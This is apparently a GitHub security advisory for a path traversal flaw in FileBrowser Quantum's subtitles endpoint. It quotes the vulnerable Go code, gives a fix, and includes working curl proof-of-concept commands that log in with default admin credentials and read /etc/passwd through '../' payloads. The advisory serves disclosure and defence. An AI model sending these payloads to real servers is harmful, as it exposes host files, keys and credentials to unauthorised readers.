# [H] FileBrowser Quantum's path traversal issue in subtitle handler allows any authenticated user to read arbitrary files

## Summary
Severity: High
Advisory: GHSA-vvp7-h4fj-m28w
CVE: CVE-2026-54910
CWE: CWE-22, CWE-23
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-31
Source: https://github.com/advisories/GHSA-vvp7-h4fj-m28w
Type: github-advisory

## Affected
- Go: `github.com/gtsteffaniak/filebrowser/backend` — affected >=0 <0.0.0-20260608182036-f3f4bbe80cb5

## Details
### Summary

The `subtitlesHandler` endpoint (`GET /api/media/subtitles`) accepts two user-controlled query parameters: `path` and `name`, both of which are used in filesystem operations without sanitization, creating two independent path traversal vectors.

The primary vector is the `path` parameter: it is passed directly to `idx.GetRealPath()` without calling `SanitizeUserPath()`, allowing an attacker to escape the storage root and set `parentDir` to any directory on the host. No existing anchor file is required. 

The secondary vector is the `name` parameter: it is joined with `parentDir` via `filepath.Join(parentDir, name)` without stripping directory components, allowing traversal relative to any resolved `parentDir`.

Any authenticated user (regardless of role or permissions) can exploit either vector to read any text file readable by the server process, including `/etc/passwd`, SSH keys, database credentials, and JWT signing keys.

### Details

**1. `path` parameter lacks `SanitizeUserPath()` — primary vector (`http/media.go:54`)**

```go
userscope, err := d.user.GetScopeForSourceName(source)
// ...
realPath, _, err := idx.GetRealPath(userscope, path)  // path is raw user input, no sanitization
// ...
parentDir := filepath.Dir(realPath)  // line 59: attacker controls this directory
```

`SanitizeUserPath()` explicitly rejects `..` segments:

```go
func SanitizeUserPath(userPath string) (string, error) {
    // ...
    for _, segment := range segments {
        if segment == ".." {
            return "", fmt.Errorf("invalid path: path traversal detected")
        }
    }
    // ...
}
```

Every other handler in the codebase calls `SanitizeUserPath()` before `GetRealPath()`. This handler skips it, so `path=../../etc/passwd` resolves `parentDir` to `/etc`, with no anchor file required.

**2. `name` parameter used directly in `filepath.Join` — secondary vector (`http/media.go:63`)**

```go
name := r.URL.Query().Get("name")  // line 37 — raw user input
// ...
content, err = utils.GetSubtitleSidecarContent(
    filepath.Join(parentDir, name))  // line 63 — TRAVERSAL
```

`filepath.Join(parentDir, "../../etc/passwd")` resolves the `..` components, escaping `parentDir`. This vector requires a valid file in scope as the `path` anchor.

**3. `GetSubtitleSidecarContent` reads and returns file contents (`common/utils/media.go:17-43`)**

```go
func GetSubtitleSidecarContent(subtitlePath string) (string, error) {
    info, err := os.Stat(subtitlePath)        // follows the traversed path
    // size check: < 50MB
    isText, err := IsTextFile(subtitlePath)   // checks UTF-8 validity
    content, err := os.ReadFile(subtitlePath) // reads and returns content
    return string(content), nil
}
```

The only constraint is that the target file must be UTF-8 valid and under 50MB. Binary files silently return an empty string.

**4. Endpoint is behind `withUser` but requires no special permissions**

```go
// httpRouter.go
api.HandleFunc("GET /media/subtitles", withUser(subtitlesHandler))
```

Any authenticated user can access this endpoint: no admin, modify, share, or download permission is required.

### PoC

**Vector 1: `path` traversal (no anchor file needed):**

```bash
docker run -d --name filebrowser-q-lab -p 18080:80 gtstef/filebrowser:latest && sleep 3
TOKEN=$(curl -s -X POST "http://localhost:18080/api/auth/login?username=admin" -H "X-Password: admin" | tr -d '"')
curl "http://localhost:18080/api/media/subtitles?path=../../etc/passwd&source=srv&name=passwd&embedded=false&auth=$TOKEN"
```
**Expected output:** `/etc/passwd` contents with HTTP 200.

**Vector 2: `name` traversal (anchor file required):**

```bash
mkdir -p /tmp/fbq-srv && echo "dummy" > /tmp/fbq-srv/poc.txt
docker run -d --name filebrowser-q-lab2 -p 18081:80 -v /tmp/fbq-srv:/srv gtstef/filebrowser:latest && sleep 3
TOKEN=$(curl -s -X POST "http://localhost:18081/api/auth/login?username=admin" -H "X-Password: admin" | tr -d '"')
curl "http://localhost:18081/api/media/subtitles?path=/poc.txt&source=srv&name=../../etc/passwd&embedded=false&auth=$TOKEN"
```
**Expected output:** `/etc/passwd` contents with HTTP 200.

### Impact

- **Arbitrary file read**: Any authenticated user can read any text file on the host filesystem that the server process has read permission for.
- **No anchor file required**: The `path` vector works on a default install with an empty storage root, so no existing file in scope is needed.
- **Scope bypass**: Scoped users (restricted to a subdirectory) can escape their scope via either vector and access files belonging to other users or the host system.
- **Credential exposure**: `/etc/passwd`, `/etc/shadow` (if running as root), SSH private keys, application configuration files with database passwords, API keys, and JWT signing secrets.
- **Privilege escalation**: Reading the JWT signing key from the database or config file enables forging admin tokens.
- **No special permissions required**: The endpoint only requires basic authentication: no admin, modify, share, or download permissions.

### Recommended Fix

Apply `SanitizeUserPath()` to the `path` parameter and `filepath.Base()` to the `name` parameter:

```go
// http/media.go, subtitlesHandler

// Sanitize path parameter (like all other handlers)
path, err := utils.SanitizeUserPath(path)
if err != nil {
    return http.StatusBadRequest, err
}

// Strip directory components from name to prevent traversal
name = filepath.Base(name)
```

`SanitizeUserPath()` rejects any `..` segment. `filepath.Base("../../etc/passwd")` returns `"passwd"`, preventing traversal via `name`. Additionally, consider adding a file extension allowlist to restrict `name` to subtitle formats (`.srt`, `.vtt`, `.ass`, `.ssa`, `.sub`) only.

## References
- https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-vvp7-h4fj-m28w
- https://nvd.nist.gov/vuln/detail/CVE-2026-54910
- https://github.com/gtsteffaniak/filebrowser/pull/2524
- https://github.com/gtsteffaniak/filebrowser/commit/f3f4bbe80cb569d664174aea874d7bfa008c3b5a
- https://github.com/gtsteffaniak/filebrowser
- https://github.com/gtsteffaniak/filebrowser/releases/tag/v1.4.3-beta
